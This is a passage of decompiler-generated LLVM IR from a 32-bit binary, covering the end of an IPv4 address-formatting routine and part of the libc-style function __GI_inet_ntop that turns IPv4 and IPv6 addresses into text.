  %v5_804d57e = add i32 %v4_804d57e, %v2_804d57e
  %v6_804d57e = inttoptr i32 %v5_804d57e to i8*
  store i8 %v1_804d57e, i8* %v6_804d57e, align 1
  %v0_804d582 = load i32, i32* @esi, align 4
  %v1_804d582 = add i32 %v0_804d582, 1
  store i32 %v1_804d582, i32* @edi, align 4
  store i32 %v0_804d582, i32* %ebx.global-to-local, align 4
  %v0_804d587 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d587 = trunc i32 %v0_804d587 to i8
  %v7_804d587 = icmp eq i8 %v1_804d587, 48
  %v1_804d589 = icmp eq i1 %v7_804d587, false
  %v0_804d5b0 = load i32, i32* %edx.global-to-local, align 4
  %v3_804d5b2 = trunc i32 %v0_804d5b0 to i16
  %v5_804d5b2 = udiv i16 %v3_804d5b2, 10
  %tmp = urem i16 %v5_804d5b2, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div27 = udiv i16 %tmp, 10
  %v7_804d5be = zext i16 %div27 to i32
  store i32 %v7_804d5be, i32* %eax.global-to-local, align 4
  %tmp28 = urem i16 %tmp, 10
  %v12_804d5be = zext i16 %tmp28 to i32
  %v1_804d5c1 = or i32 %v12_804d5be, 48
  %v8_804d5c1 = trunc i32 %v1_804d5c1 to i8
  store i32 %v1_804d5c1, i32* %edx.global-to-local, align 4
  %v2_804d5c4 = load i32, i32* @esp, align 4
  %v4_804d5c4 = add i32 %v2_804d5c4, 19
  br i1 %v1_804d589, label %dec_label_pc_804d5ae, label %dec_label_pc_804d58b

dec_label_pc_804d58b:                             ; preds = %dec_label_pc_804d566
  %v5_804d5a1 = add i32 %v4_804d5c4, %v0_804d582
  %v6_804d5a1 = inttoptr i32 %v5_804d5a1 to i8*
  store i8 %v8_804d5c1, i8* %v6_804d5a1, align 1
  %v0_804d5a5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d5a5 = trunc i32 %v0_804d5a5 to i8
  %v7_804d5a5 = icmp eq i8 %v1_804d5a5, 48
  br i1 %v7_804d5a5, label %dec_label_pc_804d58b.dec_label_pc_804d5cb_crit_edge, label %dec_label_pc_804d5aa

dec_label_pc_804d58b.dec_label_pc_804d5cb_crit_edge: ; preds = %dec_label_pc_804d58b
  %v3_804d5df.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d5cb

dec_label_pc_804d5aa:                             ; preds = %dec_label_pc_804d58b
  %v0_804d5aa = load i32, i32* @edi, align 4
  store i32 %v0_804d5aa, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d5cb

dec_label_pc_804d5ae:                             ; preds = %dec_label_pc_804d566
  %v5_804d5c4 = add i32 %v4_804d5c4, %v1_804d582
  %v6_804d5c4 = inttoptr i32 %v5_804d5c4 to i8*
  store i8 %v8_804d5c1, i8* %v6_804d5c4, align 1
  %v0_804d5c8 = load i32, i32* @esi, align 4
  %v1_804d5c8 = add i32 %v0_804d5c8, 2
  store i32 %v1_804d5c8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d5cb

dec_label_pc_804d5cb:                             ; preds = %dec_label_pc_804d58b.dec_label_pc_804d5cb_crit_edge, %dec_label_pc_804d5aa, %dec_label_pc_804d5ae
  %v3_804d5df = phi i32 [ %v3_804d5df.pre, %dec_label_pc_804d58b.dec_label_pc_804d5cb_crit_edge ], [ %v0_804d5aa, %dec_label_pc_804d5aa ], [ %v1_804d5c8, %dec_label_pc_804d5ae ]
  store i32 %v2_804d56a, i32* %edx.global-to-local, align 4
  %v2_804d5cf = load i8, i8* %v5_804d56c, align 1
  store i32 10, i32* %ecx.global-to-local, align 4
  %div8 = udiv i8 %v2_804d5cf, 10
  %v7_804d5d9 = zext i8 %div8 to i32
  store i32 %v7_804d5d9, i32* %eax.global-to-local, align 4
  %tmp20 = urem i8 %v2_804d5cf, 10
  %v12_804d5d9 = zext i8 %tmp20 to i32
  %v1_804d5dc = or i32 %v12_804d5d9, 48
  %v8_804d5dc = trunc i32 %v1_804d5dc to i8
  store i32 %v1_804d5dc, i32* %edx.global-to-local, align 4
  %v2_804d5df = load i32, i32* @esp, align 4
  %v4_804d5df = add i32 %v3_804d5df, 19
  %v5_804d5df = add i32 %v4_804d5df, %v2_804d5df
  %v6_804d5df = inttoptr i32 %v5_804d5df to i8*
  store i8 %v8_804d5dc, i8* %v6_804d5df, align 1
  %v0_804d5e3 = load i32, i32* @esp, align 4
  %v1_804d5e3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d5e3 = add i32 %v0_804d5e3, 20
  %v3_804d5e3 = add i32 %v2_804d5e3, %v1_804d5e3
  %v4_804d5e3 = inttoptr i32 %v3_804d5e3 to i8*
  store i8 46, i8* %v4_804d5e3, align 1
  %v0_804d5e8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d5e8 = add i32 %v0_804d5e8, 2
  store i32 %v1_804d5e8, i32* @esi, align 4
  %v0_804d5eb = load i32, i32* %ebp.global-to-local, align 4
  %v1_804d5eb = add i32 %v0_804d5eb, 1
  store i32 %v1_804d5eb, i32* %ebp.global-to-local, align 4
  %v7_804d5ef = icmp sgt i32 %v1_804d5eb, 3
  br i1 %v7_804d5ef, label %dec_label_pc_804d5f5, label %dec_label_pc_804d5cb.dec_label_pc_804d566_crit_edge

dec_label_pc_804d5cb.dec_label_pc_804d566_crit_edge: ; preds = %dec_label_pc_804d5cb
  %v0_804d573.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804d57e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d566

dec_label_pc_804d5f5:                             ; preds = %dec_label_pc_804d5cb
  %v0_804d5f5 = load i32, i32* @esp, align 4
  %v2_804d5f5 = add i32 %v0_804d5e8, 20
  %v3_804d5f5 = add i32 %v2_804d5f5, %v0_804d5f5
  %v4_804d5f5 = inttoptr i32 %v3_804d5f5 to i8*
  store i8 0, i8* %v4_804d5f5, align 1
  %v2_804d5fa = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_804d5fa, i32* %ebx.global-to-local, align 4
  %tmp21 = bitcast i32* %stack_var_-33 to i8*
  %v3_804d5ff = call i32 @strlen(i8* %tmp21)
  store i32 %v3_804d5ff, i32* @eax, align 4
  %v3_804d604 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v3_804d604, i32* %ecx.global-to-local, align 4
  %v3_804d605 = load i32, i32* %stack_var_-52, align 4
  %tmp26 = icmp ugt i32 %v3_804d5ff, %v3_804d605
  br i1 %tmp26, label %dec_label_pc_804d60a, label %dec_label_pc_804d619

dec_label_pc_804d60a:                             ; preds = %dec_label_pc_804d5f5
  %v2_804d60a = call i32 @__GI___errno_location(i32 %v3_804d604)
  %v1_804d60f = inttoptr i32 %v2_804d60a to i32*
  store i32 28, i32* %v1_804d60f, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d625

dec_label_pc_804d619:                             ; preds = %dec_label_pc_804d5f5
  %v3_804d61e = inttoptr i32 %v0_804d551 to i8*
  %v4_804d61e = call i32 @strcpy(i8* %v3_804d61e, i32 %v2_804d5fa)
  store i32 %v4_804d61e, i32* %eax.global-to-local, align 4
  store i32 %v0_804d551, i32* %ebp.global-to-local, align 4
  %v3_804d624 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v3_804d624, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d625

dec_label_pc_804d625:                             ; preds = %dec_label_pc_804d60a, %dec_label_pc_804d619
  %v0_804d62c = phi i32 [ 0, %dec_label_pc_804d60a ], [ %v4_804d61e, %dec_label_pc_804d619 ]
  store i32 %v0_804d548, i32* @esi, align 4
  store i32 %v0_804d547, i32* @edi, align 4
  ret i32 %v0_804d62c

; uselistorder directives
  uselistorder i32 %v3_804d604, { 1, 0 }
  uselistorder i32 %v1_804d5eb, { 0, 2, 1 }
  uselistorder i32 %v1_804d5e8, { 1, 0 }
  uselistorder i32 %v1_804d5dc, { 1, 0 }
  uselistorder i32 %v1_804d5c1, { 1, 0 }
  uselistorder i32 %v1_804d57b, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 1, 2, 4, 3 }
  uselistorder i32* %ebx.global-to-local, { 0, 3, 4, 1, 2, 5, 6 }
  uselistorder i8 100, { 1, 0 }
  uselistorder label %dec_label_pc_804d625, { 1, 0 }
  uselistorder label %dec_label_pc_804d5cb, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i8*, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d62e = load i32, i32* @edi, align 4
  %v0_804d62f = load i32, i32* @esi, align 4
  %v0_804d630 = load i32, i32* @ebx, align 4
  store i32 %v0_804d630, i32* %stack_var_-16, align 4
  %v4_804d630 = ptrtoint i32* %stack_var_-16 to i32
  %v9_804d638 = icmp eq i32 %arg1, 2
  br i1 %v9_804d638, label %dec_label_pc_804d648, label %dec_label_pc_804d63d

dec_label_pc_804d63d:                             ; preds = %entry
  %v9_804d63d = icmp eq i32 %arg1, 10
  %v1_804d640 = icmp eq i1 %v9_804d63d, false
  br i1 %v1_804d640, label %dec_label_pc_804d7c4, label %dec_label_pc_804d660

dec_label_pc_804d648:                             ; preds = %entry
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_804d654 = call i32 @inet_ntop4(i32 %v0_804d630, i32 %v0_804d62f, i32 %v0_804d62e)
  br label %dec_label_pc_804d7d1

dec_label_pc_804d660:                             ; preds = %dec_label_pc_804d63d
  store i32 8, i32* %ecx.global-to-local, align 4
  %tmp45 = bitcast i32* %stack_var_-48 to i8*
  %v5_804d66b = call i8* @_memset(i8* %tmp45, i32 0, i32 8)
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_804d688 = add i32 %arg2, 1
  br label %dec_label_pc_804d66f

dec_label_pc_804d66f:                             ; preds = %dec_label_pc_804d66f, %dec_label_pc_804d660
  %v0_804d688 = phi i32 [ %v1_804d693, %dec_label_pc_804d66f ], [ 0, %dec_label_pc_804d660 ]
  %v1_804d678 = ashr i32 %v0_804d688, 31
  %v2_804d679 = zext i32 %v0_804d688 to i64
  %v4_804d679 = zext i32 %v1_804d678 to i64
  %v5_804d679 = mul nuw i64 %v4_804d679, 4294967296
  %v6_804d679 = or i64 %v5_804d679, %v2_804d679
  %v8_804d679 = sdiv i64 %v6_804d679, 2
  %v9_804d679 = trunc i64 %v8_804d679 to i32
  %v2_804d681 = add i32 %v0_804d688, %arg2
  %v3_804d681 = inttoptr i32 %v2_804d681 to i8*
  %v4_804d681 = load i8, i8* %v3_804d681, align 1
  %v5_804d681 = zext i8 %v4_804d681 to i32
  %v2_804d685 = mul nuw nsw i32 %v5_804d681, 256
  %v3_804d688 = add i32 %v2_804d688, %v0_804d688
  %v4_804d688 = inttoptr i32 %v3_804d688 to i8*
  %v5_804d688 = load i8, i8* %v4_804d688, align 1
  %v6_804d688 = zext i8 %v5_804d688 to i32
  %v2_804d68d = or i32 %v6_804d688, %v2_804d685
  %v1_804d68f = load i32, i32* @esp, align 4
  %v3_804d68f = mul i32 %v9_804d679, 4
  %v4_804d68f = add i32 %v3_804d68f, 52
  %v5_804d68f = add i32 %v4_804d68f, %v1_804d68f
  %v6_804d68f = inttoptr i32 %v5_804d68f to i32*
  store i32 %v2_804d68d, i32* %v6_804d68f, align 4
  %v0_804d693 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d693 = add i32 %v0_804d693, 2
  store i32 %v1_804d693, i32* %ecx.global-to-local, align 4
  %v7_804d699 = icmp sgt i32 %v1_804d693, 15
  br i1 %v7_804d699, label %dec_label_pc_804d69b, label %dec_label_pc_804d66f

dec_label_pc_804d69b:                             ; preds = %dec_label_pc_804d66f
  store i32 -1, i32* @esi, align 4
  %v0_804d6a5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d6a5

dec_label_pc_804d6a5:                             ; preds = %dec_label_pc_804d69b, %dec_label_pc_804d6d2
  %v0_804d6d264 = phi i32 [ 0, %dec_label_pc_804d69b ], [ %v1_804d6d2, %dec_label_pc_804d6d2 ]
  %v0_804d6bd63 = phi i32 [ -1, %dec_label_pc_804d69b ], [ %v0_804d6bd9, %dec_label_pc_804d6d2 ]
  %v0_804d6e662 = phi i32 [ %v1_804d693, %dec_label_pc_804d69b ], [ %v0_804d6ba11, %dec_label_pc_804d6d2 ]
  %v0_804d6dd61 = phi i32 [ -1, %dec_label_pc_804d69b ], [ %v0_804d6c213, %dec_label_pc_804d6d2 ]
  %v0_804d6e860 = phi i32 [ -1, %dec_label_pc_804d69b ], [ %v0_804d6cd16, %dec_label_pc_804d6d2 ]
  %v2_804d6a5 = mul nuw nsw i32 %v0_804d6d264, 4
  %v3_804d6a5 = add nuw nsw i32 %v2_804d6a5, 52
  %v4_804d6a5 = add i32 %v3_804d6a5, %v0_804d6a5.pre
  %v5_804d6a5 = inttoptr i32 %v4_804d6a5 to i32*
  %v6_804d6a5 = load i32, i32* %v5_804d6a5, align 4
  %v7_804d6a5 = icmp eq i32 %v6_804d6a5, 0
  %v1_804d6aa = icmp eq i1 %v7_804d6a5, false
  %v10_804d6bd = icmp eq i32 %v0_804d6bd63, -1
  br i1 %v1_804d6aa, label %dec_label_pc_804d6bd, label %dec_label_pc_804d6ac

dec_label_pc_804d6ac:                             ; preds = %dec_label_pc_804d6a5
  %v1_804d6af = icmp eq i1 %v10_804d6bd, false
  br i1 %v1_804d6af, label %dec_label_pc_804d6ba, label %dec_label_pc_804d6b1

dec_label_pc_804d6b1:                             ; preds = %dec_label_pc_804d6ac
  store i32 1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804d6d2

dec_label_pc_804d6ba:                             ; preds = %dec_label_pc_804d6ac
  %v1_804d6ba = add i32 %v0_804d6e662, 1
  store i32 %v1_804d6ba, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804d6d2

dec_label_pc_804d6bd:                             ; preds = %dec_label_pc_804d6a5
  br i1 %v10_804d6bd, label %dec_label_pc_804d6d2, label %dec_label_pc_804d6c2

dec_label_pc_804d6c2:                             ; preds = %dec_label_pc_804d6bd
  %v10_804d6c2 = icmp eq i32 %v0_804d6dd61, -1
  %v1_804d6c7 = load i32, i32* @ebp, align 4
  %v7_804d6c9 = icmp sgt i32 %v0_804d6e662, %v1_804d6c7
  %or.cond = or i1 %v10_804d6c2, %v7_804d6c9
  br i1 %or.cond, label %dec_label_pc_804d6cb, label %dec_label_pc_804d6cf

dec_label_pc_804d6cb:                             ; preds = %dec_label_pc_804d6c2
  store i32 %v0_804d6e662, i32* @ebp, align 4
  store i32 %v0_804d6e860, i32* @esi, align 4
  br label %dec_label_pc_804d6cf

dec_label_pc_804d6cf:                             ; preds = %dec_label_pc_804d6c2, %dec_label_pc_804d6cb
  %v0_804d6c215 = phi i32 [ %v0_804d6e860, %dec_label_pc_804d6cb ], [ %v0_804d6dd61, %dec_label_pc_804d6c2 ]
  br label %dec_label_pc_804d6d2

dec_label_pc_804d6d2:                             ; preds = %dec_label_pc_804d6bd, %dec_label_pc_804d6ba, %dec_label_pc_804d6b1, %dec_label_pc_804d6cf
  %v0_804d6cd16 = phi i32 [ %v0_804d6e860, %dec_label_pc_804d6bd ], [ %v0_804d6e860, %dec_label_pc_804d6ba ], [ %v0_804d6d264, %dec_label_pc_804d6b1 ], [ -1, %dec_label_pc_804d6cf ]
  %v0_804d6bd9 = phi i32 [ -1, %dec_label_pc_804d6bd ], [ %v0_804d6bd63, %dec_label_pc_804d6ba ], [ %v0_804d6d264, %dec_label_pc_804d6b1 ], [ -1, %dec_label_pc_804d6cf ]
  %v0_804d6c213 = phi i32 [ %v0_804d6dd61, %dec_label_pc_804d6bd ], [ %v0_804d6dd61, %dec_label_pc_804d6ba ], [ %v0_804d6dd61, %dec_label_pc_804d6b1 ], [ %v0_804d6c215, %dec_label_pc_804d6cf ]
  %v0_804d6ba11 = phi i32 [ %v0_804d6e662, %dec_label_pc_804d6bd ], [ %v1_804d6ba, %dec_label_pc_804d6ba ], [ 1, %dec_label_pc_804d6b1 ], [ %v0_804d6e662, %dec_label_pc_804d6cf ]
  %v1_804d6d2 = add nuw nsw i32 %v0_804d6d264, 1
  %exitcond = icmp eq i32 %v1_804d6d2, 8
  br i1 %exitcond, label %dec_label_pc_804d6d8, label %dec_label_pc_804d6a5

dec_label_pc_804d6d8:                             ; preds = %dec_label_pc_804d6d2
  %v10_804d6d8 = icmp eq i32 %v0_804d6cd16, -1
  %v10_804d6ea = icmp eq i32 %v0_804d6c213, -1
  br i1 %v10_804d6d8, label %dec_label_pc_804d6ea, label %dec_label_pc_804d6dd

dec_label_pc_804d6dd:                             ; preds = %dec_label_pc_804d6d8
  br i1 %v10_804d6ea, label %dec_label_pc_804d6e6, label %dec_label_pc_804d6e2

dec_label_pc_804d6e2:                             ; preds = %dec_label_pc_804d6dd
  %v1_804d6e2 = load i32, i32* @ebp, align 4
  %v7_804d6e4 = icmp sgt i32 %v0_804d6ba11, %v1_804d6e2
  br i1 %v7_804d6e4, label %dec_label_pc_804d6e6, label %dec_label_pc_804d6ea.thread

dec_label_pc_804d6e6:                             ; preds = %dec_label_pc_804d6e2, %dec_label_pc_804d6dd
  store i32 %v0_804d6ba11, i32* @ebp, align 4
  store i32 %v0_804d6cd16, i32* @esi, align 4
  br label %dec_label_pc_804d6ea.thread

dec_label_pc_804d6ea.thread:                      ; preds = %dec_label_pc_804d6e2, %dec_label_pc_804d6e6
  %v1_804d6fd.pre48 = phi i32 [ %v0_804d6ba11, %dec_label_pc_804d6e6 ], [ %v1_804d6e2, %dec_label_pc_804d6e2 ]
  %v0_804d6ea.ph = phi i32 [ %v0_804d6cd16, %dec_label_pc_804d6e6 ], [ %v0_804d6c213, %dec_label_pc_804d6e2 ]
  br label %dec_label_pc_804d6ef

dec_label_pc_804d6ea:                             ; preds = %dec_label_pc_804d6d8
  %v1_804d6fd.pre = load i32, i32* @ebp, align 4
  br i1 %v10_804d6ea, label %dec_label_pc_804d6f7, label %dec_label_pc_804d6ef

dec_label_pc_804d6ef:                             ; preds = %dec_label_pc_804d6ea.thread, %dec_label_pc_804d6ea
  %v1_804d6fd.pre50 = phi i32 [ %v1_804d6fd.pre48, %dec_label_pc_804d6ea.thread ], [ %v1_804d6fd.pre, %dec_label_pc_804d6ea ]
  %v0_804d6ea49 = phi i32 [ %v0_804d6ea.ph, %dec_label_pc_804d6ea.thread ], [ %v0_804d6c213, %dec_label_pc_804d6ea ]
  %v1_804d6ef = add i32 %v1_804d6fd.pre50, -1
  %v6_804d6ef = sub i32 0, %v1_804d6fd.pre50
  %v7_804d6ef = and i32 %v1_804d6fd.pre50, %v6_804d6ef
  %v8_804d6ef = icmp slt i32 %v7_804d6ef, 0
  %v9_804d6ef = icmp eq i32 %v1_804d6ef, 0
  %v10_804d6ef = icmp slt i32 %v1_804d6ef, 0
  %v3_804d6f2 = icmp eq i1 %v10_804d6ef, %v8_804d6ef
  %v4_804d6f2 = icmp eq i1 %v9_804d6ef, false
  %v5_804d6f2 = and i1 %v4_804d6f2, %v3_804d6f2
  br i1 %v5_804d6f2, label %dec_label_pc_804d6f7, label %dec_label_pc_804d6f4

dec_label_pc_804d6f4:                             ; preds = %dec_label_pc_804d6ef
  store i32 -1, i32* @esi, align 4
  br label %dec_label_pc_804d6f7

dec_label_pc_804d6f7:                             ; preds = %dec_label_pc_804d6ea, %dec_label_pc_804d6ef, %dec_label_pc_804d6f4
  %v1_804d6fd.pre51 = phi i32 [ %v1_804d6fd.pre50, %dec_label_pc_804d6ef ], [ %v1_804d6fd.pre50, %dec_label_pc_804d6f4 ], [ %v1_804d6fd.pre, %dec_label_pc_804d6ea ]
  %v0_804d6fd = phi i32 [ %v0_804d6ea49, %dec_label_pc_804d6ef ], [ -1, %dec_label_pc_804d6f4 ], [ -1, %dec_label_pc_804d6ea ]
  %v2_804d6f7 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_804d6f7, i32* @edi, align 4
  store i32 0, i32* @ebx, align 4
  %v2_804d6fd = add i32 %v0_804d6fd, %v1_804d6fd.pre51
  store i32 %v2_804d6fd, i32* %stack_var_-100, align 4
  %v12_804d738 = icmp eq i32 %tmp, 65535
  %v10_804d78455 = icmp eq i32 %v0_804d6fd, -1
  %v1_804d740 = icmp eq i1 %v12_804d738, false
  br label %dec_label_pc_804d705

dec_label_pc_804d705:                             ; preds = %dec_label_pc_804d6f7, %dec_label_pc_804d77e
  %v10_804d78459 = phi i1 [ %v10_804d78455, %dec_label_pc_804d6f7 ], [ %v10_804d784, %dec_label_pc_804d77e ]
  %v0_804d71d58 = phi i32 [ 0, %dec_label_pc_804d6f7 ], [ %v1_804d77e, %dec_label_pc_804d77e ]
  %v1_804d71357 = phi i32 [ %v0_804d6fd, %dec_label_pc_804d6f7 ], [ %v0_804d784.pre, %dec_label_pc_804d77e ]
  %v0_804d72156 = phi i32 [ %v2_804d6f7, %dec_label_pc_804d6f7 ], [ %v0_804d71722, %dec_label_pc_804d77e ]
  br i1 %v10_804d78459, label %dec_label_pc_804d71d, label %dec_label_pc_804d70a

dec_label_pc_804d70a:                             ; preds = %dec_label_pc_804d705
  %v12_804d70a = icmp eq i32 %v0_804d71d58, %v1_804d71357
  %v5_804d70c = icmp slt i32 %v0_804d71d58, %v1_804d71357
  br i1 %v5_804d70c, label %dec_label_pc_804d71d, label %dec_label_pc_804d70e

dec_label_pc_804d70e:                             ; preds = %dec_label_pc_804d70a
  %v3_804d70e = load i32, i32* %stack_var_-100, align 4
  %v5_804d711 = icmp slt i32 %v0_804d71d58, %v3_804d70e
  br i1 %v5_804d711, label %dec_label_pc_804d713, label %dec_label_pc_804d71d

dec_label_pc_804d713:                             ; preds = %dec_label_pc_804d70e
  %v1_804d715 = icmp eq i1 %v12_804d70a, false
  br i1 %v1_804d715, label %dec_label_pc_804d77e, label %dec_label_pc_804d717

dec_label_pc_804d717:                             ; preds = %dec_label_pc_804d713
  %v1_804d717 = inttoptr i32 %v0_804d72156 to i8*
  store i8 58, i8* %v1_804d717, align 1
  %v0_804d71a = load i32, i32* @edi, align 4
  %v1_804d71a = add i32 %v0_804d71a, 1
  store i32 %v1_804d71a, i32* @edi, align 4
  br label %dec_label_pc_804d77e

dec_label_pc_804d71d:                             ; preds = %dec_label_pc_804d70e, %dec_label_pc_804d70a, %dec_label_pc_804d705
  %v1_804d71d = icmp eq i32 %v0_804d71d58, 0
  br i1 %v1_804d71d, label %dec_label_pc_804d76a, label %dec_label_pc_804d721

dec_label_pc_804d721:                             ; preds = %dec_label_pc_804d71d
  %v1_804d721 = inttoptr i32 %v0_804d72156 to i8*
  store i8 58, i8* %v1_804d721, align 1
  %v0_804d724 = load i32, i32* @edi, align 4
  %v1_804d724 = add i32 %v0_804d724, 1
  store i32 %v1_804d724, i32* @edi, align 4
  %v0_804d725 = load i32, i32* @ebx, align 4
  %v9_804d725 = icmp eq i32 %v0_804d725, 6
  %v1_804d728 = icmp eq i1 %v9_804d725, false
  br i1 %v1_804d728, label %dec_label_pc_804d76a, label %dec_label_pc_804d72a

dec_label_pc_804d72a:                             ; preds = %dec_label_pc_804d721
  %v0_804d72a = load i32, i32* @esi, align 4
  %v1_804d72a = icmp eq i32 %v0_804d72a, 0
  %v1_804d72c = icmp eq i1 %v1_804d72a, false
  br i1 %v1_804d72c, label %dec_label_pc_804d76a, label %dec_label_pc_804d72e

dec_label_pc_804d72e:                             ; preds = %dec_label_pc_804d72a
  %v0_804d72e = load i32, i32* @ebp, align 4
  %v9_804d72e = icmp eq i32 %v0_804d72e, 6
  br i1 %v9_804d72e, label %dec_label_pc_804d742, label %dec_label_pc_804d733

dec_label_pc_804d733:                             ; preds = %dec_label_pc_804d72e
  %v9_804d733 = icmp eq i32 %v0_804d72e, 5
  %v1_804d736 = icmp eq i1 %v9_804d733, false
  br i1 %v1_804d736, label %dec_label_pc_804d76a, label %dec_label_pc_804d738

dec_label_pc_804d738:                             ; preds = %dec_label_pc_804d733
  br i1 %v1_804d740, label %dec_label_pc_804d76a, label %dec_label_pc_804d742

dec_label_pc_804d742:                             ; preds = %dec_label_pc_804d738, %dec_label_pc_804d72e
  %v1_804d724.neg = sub i32 -1, %v0_804d724
  %v2_804d746 = add i32 %v4_804d630, -32
  %v1_804d748 = add i32 %v2_804d746, %v1_804d724.neg
  store i32 %v1_804d748, i32* @ecx, align 4
  %v1_804d74f = add i32 %arg2, 12
  store i32 %v1_804d74f, i32* @eax, align 4
  store i32 %v1_804d724, i32* @edx, align 4
  %v0_804d754 = load i32, i32* %stack_var_-100, align 4
  %v3_804d754 = call i32 @inet_ntop4(i32 %v0_804d754, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_804d75b = icmp eq i32 %v3_804d754, 0
  br i1 %v1_804d75b, label %dec_label_pc_804d7d1, label %dec_label_pc_804d75f

dec_label_pc_804d75f:                             ; preds = %dec_label_pc_804d742
  %v0_804d75f = load i32, i32* @edi, align 4
  %v5_804d75f = inttoptr i32 %v0_804d75f to i8*
  %v3_804d760 = call i32 @strlen(i8* %v5_804d75f)
  %v0_804d766 = load i32, i32* @edi, align 4
  %v2_804d766 = add i32 %v0_804d766, %v3_804d760
  store i32 %v2_804d766, i32* @edi, align 4
  %v0_804d789.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d789

dec_label_pc_804d76a:                             ; preds = %dec_label_pc_804d738, %dec_label_pc_804d733, %dec_label_pc_804d72a, %dec_label_pc_804d721, %dec_label_pc_804d71d
  %v0_804d773 = phi i32 [ %v1_804d724, %dec_label_pc_804d738 ], [ %v1_804d724, %dec_label_pc_804d733 ], [ %v1_804d724, %dec_label_pc_804d72a ], [ %v1_804d724, %dec_label_pc_804d721 ], [ %v0_804d72156, %dec_label_pc_804d71d ]
  %v1_804d76a = phi i32 [ %v0_804d725, %dec_label_pc_804d738 ], [ %v0_804d725, %dec_label_pc_804d733 ], [ %v0_804d725, %dec_label_pc_804d72a ], [ %v0_804d725, %dec_label_pc_804d721 ], [ 0, %dec_label_pc_804d71d ]
  %v0_804d76a = load i32, i32* @esp, align 4
  %v2_804d76a = mul i32 %v1_804d76a, 4
  %v3_804d76a = add i32 %v0_804d76a, 52
  %v4_804d76a = add i32 %v3_804d76a, %v2_804d76a
  %v5_804d76a = inttoptr i32 %v4_804d76a to i32*
  %v6_804d76a = load i32, i32* %v5_804d76a, align 4
  %v5_804d773 = inttoptr i32 %v0_804d773 to i8*
  store i8* %v5_804d773, i8** %stack_var_-112, align 4
  %v6_804d774 = call i32 @sprintf(i32 %v0_804d773, i32 ptrtoint ([3 x i8]* @global_var_80512ac.102 to i32), i32 %v6_804d76a)
  %v0_804d779 = load i32, i32* @edi, align 4
  %v3_804d779 = add i32 %v0_804d779, %v6_804d774
  store i32 %v3_804d779, i32* @edi, align 4
  br label %dec_label_pc_804d77e

dec_label_pc_804d77e:                             ; preds = %dec_label_pc_804d713, %dec_label_pc_804d717, %dec_label_pc_804d76a
  %v0_804d71722 = phi i32 [ %v0_804d72156, %dec_label_pc_804d713 ], [ %v1_804d71a, %dec_label_pc_804d717 ], [ %v3_804d779, %dec_label_pc_804d76a ]
  %v0_804d77e = load i32, i32* @ebx, align 4
  %v1_804d77e = add i32 %v0_804d77e, 1
  store i32 %v1_804d77e, i32* @ebx, align 4
  %v0_804d784.pre = load i32, i32* @esi, align 4
  %v7_804d782 = icmp sgt i32 %v1_804d77e, 7
  %v10_804d784 = icmp eq i32 %v0_804d784.pre, -1
  br i1 %v7_804d782, label %dec_label_pc_804d784, label %dec_label_pc_804d705

dec_label_pc_804d784:                             ; preds = %dec_label_pc_804d77e
  br i1 %v10_804d784, label %dec_label_pc_804d795, label %dec_label_pc_804d789

dec_label_pc_804d789:                             ; preds = %dec_label_pc_804d784, %dec_label_pc_804d75f
  %v0_804d791 = phi i32 [ %v0_804d71722, %dec_label_pc_804d784 ], [ %v2_804d766, %dec_label_pc_804d75f ]
  %v0_804d789 = phi i32 [ %v0_804d784.pre, %dec_label_pc_804d784 ], [ %v0_804d789.pre, %dec_label_pc_804d75f ]
  %v1_804d789 = load i32, i32* @ebp, align 4
  %v2_804d789 = add i32 %v1_804d789, %v0_804d789
  %v9_804d78c = icmp eq i32 %v2_804d789, 8
  %v1_804d78f = icmp eq i1 %v9_804d78c, false
  br i1 %v1_804d78f, label %dec_label_pc_804d795, label %dec_label_pc_804d791

dec_label_pc_804d791:                             ; preds = %dec_label_pc_804d789
  %v1_804d791 = inttoptr i32 %v0_804d791 to i8*
  store i8 58, i8* %v1_804d791, align 1
  %v0_804d794 = load i32, i32* @edi, align 4
  %v1_804d794 = add i32 %v0_804d794, 1
  store i32 %v1_804d794, i32* @edi, align 4
  br label %dec_label_pc_804d795

dec_label_pc_804d795:                             ; preds = %dec_label_pc_804d789, %dec_label_pc_804d784, %dec_label_pc_804d791
  %v0_804d795 = phi i32 [ %v0_804d791, %dec_label_pc_804d789 ], [ %v0_804d71722, %dec_label_pc_804d784 ], [ %v1_804d794, %dec_label_pc_804d791 ]
  %v1_804d795 = inttoptr i32 %v0_804d795 to i8*
  store i8 0, i8* %v1_804d795, align 1
  %v0_804d79c = load i32, i32* @edi, align 4
  %v1_804d79c = sub i32 1, %v2_804d6f7
  %v2_804d79f = add i32 %v1_804d79c, %v0_804d79c
